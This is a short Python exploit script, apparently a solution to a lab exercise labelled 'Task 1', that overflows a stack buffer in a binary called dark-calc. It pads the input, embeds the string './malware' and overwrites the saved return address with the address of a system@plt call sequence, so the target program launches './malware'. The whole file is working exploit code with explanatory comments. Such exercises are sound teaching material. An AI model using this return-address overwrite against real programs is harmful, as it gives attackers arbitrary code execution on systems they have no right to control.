#!/usr/bin/env python3
"""Task 1: exploit the return-address overwrite in attack/dark-calc."""
import sys
import struct

# expression starts at rbp-0x10.  The return address is 0x18 bytes later:
# 16 bytes for expression plus 8 bytes for the saved rbp.
#
# input() copies the prefix through its embedded NUL into command_buf.  This
# address is the `mov edi, command_buf; call system@plt` sequence in eval().
# It sets system's argument to "./malware" and calls it with ABI alignment.
SYSTEM_CALL = 0x401A6B
payload = (
    b"./malware\x00".ljust(0x18, b"A")
    + struct.pack("<Q", SYSTEM_CALL)
)

sys.stdout.buffer.write(payload + b"\n")
